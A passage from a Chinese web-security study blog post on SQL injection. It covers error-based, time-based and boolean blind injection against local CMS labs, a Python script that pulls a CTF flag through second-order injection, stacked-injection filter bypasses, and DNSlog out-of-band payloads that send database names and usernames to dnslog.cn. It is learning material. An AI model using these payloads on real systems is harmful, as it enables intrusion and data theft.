+<li>留言板: 显然会将数据写入到数据库, 写入时不需要会显得, 所以选用盲注</li>
+<li><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970652984-dda77749-cecc-4fd0-95bf-1ac1594e31c4.png#averageHue=%23fcfcfc&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=drop&id=u2bb66828&margin=%5Bobject%20Object%5D&name=%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-12%20161720.png&originHeight=357&originWidth=892&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16689&status=done&style=none&taskId=ua2ff3515-b69b-4dd1-b844-9670f560d9b&title=" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-09-12 161720.png"></li>
+<li>‘ or updatexml(1,concat(0x3a,(version())),1) or ‘</li>
+<li>‘ or updatexml(1,concat(0x7e,(version())),0) or ‘</li>
+<li><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970562301-01177dba-cd1b-4ff7-bd32-23bc575c070e.png#averageHue=%23f3f1f0&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=0.734&from=paste&height=195&id=u2a2f4e1e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22732&status=done&style=none&taskId=uc47e707b-c976-4251-8bea-db76a0713d9&title=&width=477" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+</ul>
+</li>
+<li><h2 id="更新-update-xhcms-报错盲注-http-127-0-0-1-81-index-php-r-software-cid-1-and-updatexml-1-concat-0x7e-version-0"><a href="#更新-update-xhcms-报错盲注-http-127-0-0-1-81-index-php-r-software-cid-1-and-updatexml-1-concat-0x7e-version-0" class="headerlink" title="更新-update-xhcms-报错盲注 - http://127.0.0.1:81/index.php?r=software&cid=1 -  - and updatexml(1,concat(0x7e,(version())),0) - "></a>更新-update-xhcms-报错盲注<br> - <a target="_blank" rel="noopener" href="http://127.0.0.1:81/index.php?r=software&cid=1">http://127.0.0.1:81/index.php?r=software&cid=1</a><br> - <img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662971046141-f6981ba9-11b1-4800-bbf3-77a565fbbf99.png#averageHue=%23fbf7f6&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=294&id=ud11624c7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=368&originWidth=598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52540&status=done&style=none&taskId=ufd53a628-4bb0-45ce-8abe-0290f1da1c9&title=&width=478.4" srcset="/img/loading.gif" lazyload alt="image.png"><br> - and updatexml(1,concat(0x7e,(version())),0)<br> - <img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970559563-c41ff0ab-914f-4fa0-9f23-751d4c58bab1.png#averageHue=%23f3f1f0&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=0.7271&from=paste&height=194&id=u42899b0f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22732&status=done&style=none&taskId=u1ea862ae-49d5-4d22-bbd9-2e330177f4e&title=&width=474" srcset="/img/loading.gif" lazyload alt="image.png"></h2></li>
+<li><p>删除-delete-kkcms-延时盲注</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1:82/admin/cms_usergroup.php?del=1">http://127.0.0.1:82/admin/cms_usergroup.php?del&#x3D;1</a> and if(1&#x3D;1,sleep(5),0)</li>
+<li>delete from xtcms_user_group where ug_id&#x3D;2 and if(1&#x3D;1, sleep(5),0)</li>
+<li>delete from xtcms_user_group where ug_id&#x3D;2 or if(1&#x3D;1, sleep(5),0)</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>#SQL-盲注&amp;布尔&amp;报错&amp;延时<br>PHP开发项目-输出结果&amp;开启报错<br>基于延时：都不需要<br>&#x2F;blog&#x2F;news.php?id&#x3D;1 and if(1&#x3D;1,sleep(5),0)<br>基于布尔：有数据库输出判断标准<br>&#x2F;blog&#x2F;news.php?id&#x3D;1 and length(database())&#x3D;7<br>基于报错：有数据库报错处理判断标准<br>&#x2F;blog&#x2F;news.php?id&#x3D;2 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</p>
+<p>知识点：<br>1、查询方式增删改查四种特性决定，部分是不需要进行数据取出和显示，所以此类注入基本上需要采用盲注才能正常得到结果（黑盒测试可以根据功能判断注入查询方式）<br>2、查询方式增删改查四种特性决定应用功能点（会员注册，删除新闻，修改文章等）</p>
+<h2 id="7-CTF-amp-二次-amp-堆叠-amp-DNS带外"><a href="#7-CTF-amp-二次-amp-堆叠-amp-DNS带外" class="headerlink" title="7. CTF&amp;二次&amp;堆叠&amp;DNS带外"></a>7. CTF&amp;二次&amp;堆叠&amp;DNS带外</h2><hr>
+<h3 id="7-1-知识点："><a href="#7-1-知识点：" class="headerlink" title="7.1 知识点："></a>7.1 知识点：</h3><p>1、数据库堆叠注入<br>根据数据库类型决定是否支持多条语句执行<br>2、数据库二次注入<br>应用功能逻辑涉及上导致的先写入后组合的注入<br>3、数据库Dnslog注入<br>解决不回显(反向连接),SQL注入,命令执行,SSRF等<br>4、黑盒模式分析以上<br>二次注入：插入后调用显示操作符合<br>堆叠注入：判断注入后直接调多条执行<br>DNS注入：在注入上没太大利用价值，其他还行<br><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662964645817-9218a08f-9511-4546-8035-d9d550e53490.png#averageHue=%23eceeeb&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=drop&id=u81b759be&margin=%5Bobject%20Object%5D&name=image.png&originHeight=277&originWidth=558&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112010&status=done&style=none&taskId=u58aa954f-da43-4447-a1f5-89c8ae268f0&title=" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="7-2-演示案例："><a href="#7-2-演示案例：" class="headerlink" title="7.2 演示案例："></a>7.2 演示案例：</h3><p>select * from adf where email &#x3D;”sfa”<br>xiaodi’, address&#x3D;version() #</p>
+<ul>
+<li><p>二次注入-74CMS&amp;网鼎杯2018Unfinish</p>
+<ul>
+<li>74CMS 50分钟开始将白盒代码, 以后再听<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><br>register_url = <span class="hljs-string">&#x27;/register.php&#x27;</span><br>login_url = <span class="hljs-string">&#x27;/login.php&#x27;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    register_data = &#123;<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;111@123.com%d&#x27;</span> % i,<br>        <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;0&#x27; + ascii(substr((select * from flag) from %d for 1)) + &#x27;0&quot;</span> % i,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span><br>    &#125;<br>    res = requests.post(url=register_url, data=register_data)<br><br>    login_data = &#123;<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;111@123.com%d&#x27;</span> % i,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span><br>    &#125;<br>    res_ = requests.post(url=login_url, data=login_data)<br>    code = re.search(<span class="hljs-string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(code.group(<span class="hljs-number">1</span>))), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>堆叠注入-数据库类型&amp;强网杯2019随便注</p>
+<ul>
+<li><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662975992141-34c96e66-1229-4751-a61e-7f29d038adf0.png#averageHue=%23efeeed&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=278&id=u493b2804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47393&status=done&style=none&taskId=u8b198a81-46e8-4da4-b2a7-c3e0315ac27&title=&width=871.2" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>程序禁用了select等语句</li>
+<li>‘;SeT @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</li>
+<li>将select编码成16进制数据, 设置一个变量a, 在执行变量a</li>
+<li><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662976075905-f11b0af9-0c94-490d-8dbf-d68871cf4133.png#averageHue=%23f0f0ef&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=243&id=u57cd69aa&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20739&status=done&style=none&taskId=u23580700-9423-439d-a16b-b13cd83870d&title=&width=663.2" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+</ul>
+</li>
+<li><p>DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</p>
+</li>
+<li><p>平台<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  <a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a>  <a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
+</li>
+<li><p>应用场景：解决不回显，反向连接，SQL注入，命令执行，SSRF等</p>
+</li>
+<li><p>SQL注入：select load_file(concat(‘\\‘,(select database()),’.7logee.dnslog.cn\aa’));</p>
+</li>
+<li><p>and (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.69knl9.dnslog.cn&#x2F;abc’)))</p>
+</li>
+<li><p>命令执行：ping %USERNAME%.7logee.dnslog.cn</p>
+</li>
+</ul>
+<p>#二次注入-74CMS&amp;网鼎杯2018Unfinish<br>CTF-[网鼎杯2018]Unfinish-黑盒<br>CMS-74CMS个人会员中心-黑白盒</p>
+<p>#堆叠注入-数据库类型&amp;强网杯2019随便注<br>根据数据库类型决定是否支持多条语句执行<br>支持堆叠数据库类型：MYSQL MSSQL Postgresql等<br>‘;show databases;<br>‘;show tables;<br>‘;show columns from <code>1919810931114514</code>;<br>‘;select flag from <code>1919810931114514</code>;<br>‘;SeT @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/4-WEB%E5%AE%89%E5%85%A8/" class="category-chain-item">4.WEB安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">#SQL注入</a>
+      
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">#网络安全</a>
+      
+        <a href="/tags/WEB%E5%AE%89%E5%85%A8/">#WEB安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2.WEB攻防-SQL注入</div>
+      <div>https://wluffya.github.io/2023/01/01/5.WEB攻防-SQL注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>WLuffya</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/06/test/" title="test">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">test</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/" title="Redis基础">
+                        <span class="hidden-mobile">Redis基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
